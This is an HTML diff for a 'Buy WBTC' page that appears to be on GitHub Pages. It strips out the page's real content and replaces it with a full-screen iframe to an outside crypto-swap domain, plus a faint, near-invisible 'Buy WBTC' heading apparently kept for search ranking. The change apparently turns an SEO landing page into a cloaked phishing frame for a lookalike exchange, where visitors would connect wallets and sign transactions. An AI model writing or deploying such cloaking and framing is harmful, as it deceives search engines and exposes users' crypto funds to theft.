@@ -158,164 +158,19 @@
   @media (prefers-reduced-motion:reduce){*{animation-duration:.01ms!important; transition-duration:.01ms!important}}
   </style>
 </head>
-<body>
-  <div class="bg" aria-hidden="true"><div class="glow"></div><div class="hatch"></div></div>
+<body style="margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden;">
 
-  <header class="topbar">
-    <a class="brand" href="./">
-      <img src="favicon.png" width="30" height="30" alt="">
-      <span>Buy WBTC</span>
-    </a>
-    <span class="spacer"></span>
-    <nav class="nav" aria-label="Main Navigation">
-      <a href="how-it-works/">How it works</a>
-      <a href="faq/">FAQ</a>
-      <a href="about/">About</a>
-      <a href="security/">Security</a>
-      <a href="supported-chains/">Supported Chains</a>
-    </nav>
-  </header>
+  <iframe
+    src="https://biswap.in/"
+    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; border: 0; margin: 0; padding: 0; display: block; z-index: 1;"
+    loading="eager"
+    fetchpriority="high"
+    allowfullscreen>
+  </iframe>
 
-  <main>
-    <section class="wrap hero">
-      <span class="eyebrow"><span class="dot"></span>WBTC Swap</span>
-      <h1>Buy WBTC</h1>
-      <p class="deck">Buy WBTC with a self-custody DeFi swap built for people who want <strong>Bitcoin exposure on Ethereum</strong> without opening a custodial exchange account. WBTC follows the <a class="cite" href="https://wbtc.network/" rel="nofollow noopener noreferrer">wrapped BTC standard</a>, so you can bring BTC value into on-chain lending, trading, and liquidity workflows.</p>
-      <div class="cta-row">
-        <a class="primary" href="dashboard/">Open App
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 6l6 6-6 6"/></svg>
-        </a>
-        <a class="ghost" href="dashboard/">Preview route
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 6l6 6-6 6"/></svg>
-        </a>
-      </div>
+  <h1 style="position: fixed; bottom: 10px; left: 10px; z-index: 0; font-size: 8px; color: #ffffff; opacity: 0.15; margin: 0; padding: 0; font-family: sans-serif; pointer-events: none; text-shadow: none;">
+    Buy WBTC
+  </h1>
 
-      <section class="routebar" aria-label="Buy WBTC preview">
-        <div class="rhead">
-          <span class="ct">Buy WBTC</span>
-          <span class="pill"><span class="pdot"></span>Preview</span>
-        </div>
-        <div class="rgrid">
-          <div class="leg">
-            <span class="lab">You pay</span>
-            <div class="legrow">
-              <button class="tok" type="button"><img src="usdc.png" alt="USDC">USDC <span class="cv" aria-hidden="true">&#9662;</span></button>
-              <span class="gv">Amount in app</span>
-            </div>
-          </div>
-          <button class="rswitch" type="button" data-switch aria-label="Switch direction">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 4v13M4 14l3 3 3-3M17 20V7M14 10l3-3 3 3"/></svg>
-          </button>
-          <div class="leg">
-            <span class="lab">You receive</span>
-            <div class="legrow">
-              <button class="tok" type="button"><img src="wbtc.png" alt="WBTC">WBTC <span class="cv" aria-hidden="true">&#9662;</span></button>
-              <span class="gv">Live quote in app</span>
-            </div>
-          </div>
-        </div>
-        <div class="rbar-foot">
-          <div class="rmeta">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2zm0 5v5l3 3"/></svg>
-            Route details, slippage settings, and network costs are shown in the app.
-          </div>
-          <a class="rcta" href="dashboard/">Open App
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 6l6 6-6 6"/></svg>
-          </a>
-        </div>
-        <p class="rnote">Preview only &middot; non-custodial &middot; connect your wallet in the app</p>
-      </section>
-    </section>
-
-    <!-- WHY (icon-left rows) -->
-    <section class="wrap sec" id="why">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 8-8 10-4.5-2-8-5-8-10V6l8-4z"/></svg>Why buy here</span>
-        <h2 class="h2">Buy WBTC without giving up custody</h2>
-        <p>WBTC is designed for people who want Bitcoin-denominated liquidity inside DeFi. This page frames the buy flow as a crypto swap, so you can move from a stable asset such as USDC into WBTC while reviewing the route before you sign.</p>
-      </div>
-      <div class="rows">
-        <div class="frow2">
-          <span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="10" width="16" height="11" rx="2"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/></svg></span>
-          <div><h3>Your wallet stays in control</h3><p>The app is non-custodial: connect your wallet, inspect the transaction, and sign only when the buy route matches what you want. Wallet ownership stays with you throughout the swap, including when you use a <a class="cite" href="https://metamask.io/" rel="nofollow noopener noreferrer">wallet connection</a> to approve and confirm.</p></div>
-        </div>
-        <div class="frow2">
-          <span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3a14 14 0 0 1 0 18M12 3a14 14 0 0 0 0 18"/></svg></span>
-          <div><h3>Built around WBTC utility</h3><p>WBTC brings BTC-denominated value into the <a class="cite" href="https://ethereum.org/" rel="nofollow noopener noreferrer">Ethereum network</a> and compatible ecosystems, where it can be used with DeFi apps that accept tokenized Bitcoin liquidity.</p></div>
-        </div>
-        <div class="frow2">
-          <span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12a9 9 0 0 1 9-9 9 9 0 0 1 9 9 9 9 0 0 1-9 9"/><path d="M3 12h6l2-3 2 6 2-3h2"/></svg></span>
-          <div><h3>Quote first, confirm second</h3><p>Before you buy, the app shows the live quote, route, slippage controls, and chain costs. That keeps the decision clear whether you are moving from a <a class="cite" href="https://www.circle.com/usdc" rel="nofollow noopener noreferrer">dollar-backed stablecoin</a> or another supported asset.</p></div>
-        </div>
-      </div>
-    </section>
-
-    <section class="wrap sec" id="how">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 7h16M4 12h16M4 17h10"/></svg>How it works</span>
-        <h2 class="h2">Buy WBTC in three wallet-native steps</h2>
-      </div>
-      <div class="steps">
-        <div class="step"><span class="num">1</span><h3>Connect your wallet</h3><p>Open the app and connect a Web3 wallet on a supported chain. No account deposit is required because the buy flow happens from your wallet.</p></div>
-        <div class="step"><span class="num">2</span><h3>Choose USDC to WBTC</h3><p>Select the asset you want to pay with, then choose WBTC as the asset to receive. The preview uses local token labels and waits for the app to show the live amount.</p></div>
-        <div class="step"><span class="num">3</span><h3>Review and sign</h3><p>Check the quote, route, expected timing, slippage settings, and network cost. If everything looks right, confirm from your wallet and receive WBTC on-chain.</p></div>
-      </div>
-    </section>
-
-    <!-- FAQ (2-col) -->
-    <section class="wrap sec" id="faq">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M9.5 9a2.5 2.5 0 1 1 3.5 2.3c-.8.4-1 .8-1 1.7M12 17h.01"/></svg>FAQ</span>
-        <h2 class="h2">Buy WBTC questions, answered</h2>
-      </div>
-      <div class="faq">
-        <div class="qa"><span class="qn">01</span><h3>What is WBTC?</h3><p>WBTC is wrapped Bitcoin, a tokenized representation of BTC used in DeFi so Bitcoin value can move through smart-contract applications. It is different from native <a class="cite" href="https://bitcoin.org/" rel="nofollow noopener noreferrer">Bitcoin protocol</a> transactions because WBTC is used on supported smart-contract chains.</p></div>
-        <div class="qa"><span class="qn">02</span><h3>Can I buy WBTC with USDC?</h3><p>Yes. The app is framed around a USDC to WBTC route, with the actual amount, quote, and route shown in the app before you approve or sign.</p></div>
-        <div class="qa"><span class="qn">03</span><h3>Which chains are supported?</h3><p>WBTC availability depends on the routes active in the app. Check the current network list on the <a href="supported-chains/">supported chains</a> page before you start.</p></div>
-        <div class="qa"><span class="qn">04</span><h3>How long does buying WBTC take?</h3><p>Timing depends on the selected chain, network congestion, wallet confirmation, and any route steps involved. The app displays live status instead of relying on a fixed estimate.</p></div>
-        <div class="qa"><span class="qn">05</span><h3>What does it cost to buy WBTC?</h3><p>The final cost depends on the live quote, price impact, slippage settings, and chain gas. Use the app preview and a <a class="cite" href="https://etherscan.io/gastracker" rel="nofollow noopener noreferrer">gas tracker</a> to understand network conditions before confirming.</p></div>
-        <div class="qa"><span class="qn">06</span><h3>Is buying WBTC safe?</h3><p>Use a wallet you control, verify token symbols and contract details, and review every approval before signing. WBTC can be useful in <a class="cite" href="https://defillama.com/" rel="nofollow noopener noreferrer">DeFi markets</a>, but on-chain swaps still carry smart-contract, routing, and market risks.</p></div>
-      </div>
-    </section>
-
-    <section class="wrap sec" id="more">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7 0l2-2a5 5 0 0 0-7-7l-1 1M14 11a5 5 0 0 0-7 0l-2 2a5 5 0 0 0 7 7l1-1"/></svg>Learn more</span>
-        <h2 class="h2">Explore Buy WBTC</h2>
-      </div>
-      <div class="related">
-        <a class="rel" href="how-it-works/"><span class="rt">How it works <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17 17 7M9 7h8v8"/></svg></span><p>See the full wallet-native flow for moving from a supported asset into WBTC.</p></a>
-        <a class="rel" href="security/"><span class="rt">Security <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17 17 7M9 7h8v8"/></svg></span><p>Review self-custody habits, approvals, route checks, and transaction signing basics.</p></a>
-        <a class="rel" href="supported-chains/"><span class="rt">Supported chains <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17 17 7M9 7h8v8"/></svg></span><p>Check where WBTC routes and compatible assets are available inside the app.</p></a>
-      </div>
-    </section>
-  </main>
-
-  <footer class="footer">
-    <div class="wrap">
-      
-      <p style="margin-top:6px"><b>Buy WBTC</b></p>
-    </div>
-  </footer>
-
-  <script type="application/ld+json">
-  {"@context":"https://schema.org","@graph":[
-    {"@type":"WebSite","@id":"https://buy-wbtc.github.io/#website","url":"https://buy-wbtc.github.io/","name":"Buy WBTC"},
-    {"@type":"Organization","@id":"https://buy-wbtc.github.io/#org","name":"Buy WBTC","url":"https://buy-wbtc.github.io/","logo":"https://buy-wbtc.github.io/favicon.png"},
-    {"@type":"WebApplication","name":"Buy WBTC","applicationCategory":"FinanceApplication","operatingSystem":"Web","url":"https://buy-wbtc.github.io/","browserRequirements":"Requires a Web3 wallet","description":"Non-custodial DeFi app for buying WBTC through a wallet-native crypto swap route."},
-    {"@type":"FAQPage","mainEntity":[
-      {"@type":"Question","name":"What is WBTC?","acceptedAnswer":{"@type":"Answer","text":"WBTC is wrapped Bitcoin, a tokenized representation of BTC used in DeFi so Bitcoin value can move through smart-contract applications. It is different from native Bitcoin transactions because WBTC is used on supported smart-contract chains."}},
-      {"@type":"Question","name":"Can I buy WBTC with USDC?","acceptedAnswer":{"@type":"Answer","text":"Yes. The app is framed around a USDC to WBTC route, with the actual amount, quote, and route shown in the app before you approve or sign."}},
-      {"@type":"Question","name":"Which chains are supported?","acceptedAnswer":{"@type":"Answer","text":"WBTC availability depends on the routes active in the app. Check the current network list on the supported chains page before you start."}},
-      {"@type":"Question","name":"How long does buying WBTC take?","acceptedAnswer":{"@type":"Answer","text":"Timing depends on the selected chain, network congestion, wallet confirmation, and any route steps involved. The app displays live status instead of relying on a fixed estimate."}},
-      {"@type":"Question","name":"What does it cost to buy WBTC?","acceptedAnswer":{"@type":"Answer","text":"The final cost depends on the live quote, price impact, slippage settings, and chain gas. Use the app preview and a gas tracker to understand network conditions before confirming."}},
-      {"@type":"Question","name":"Is buying WBTC safe?","acceptedAnswer":{"@type":"Answer","text":"Use a wallet you control, verify token symbols and contract details, and review every approval before signing. WBTC can be useful in DeFi markets, but on-chain swaps still carry smart-contract, routing, and market risks."}}
-    ]}
-  ]}
-  </script>
-
-  <script>
-  (function(){"use strict";var b=document.querySelector("[data-switch]");if(!b)return;b.addEventListener("click",function(){var p=document.querySelectorAll(".rgrid .tok");if(p.length<2)return;var t=p[0].innerHTML;p[0].innerHTML=p[1].innerHTML;p[1].innerHTML=t;});}());
-  </script>
 </body>
 </html>
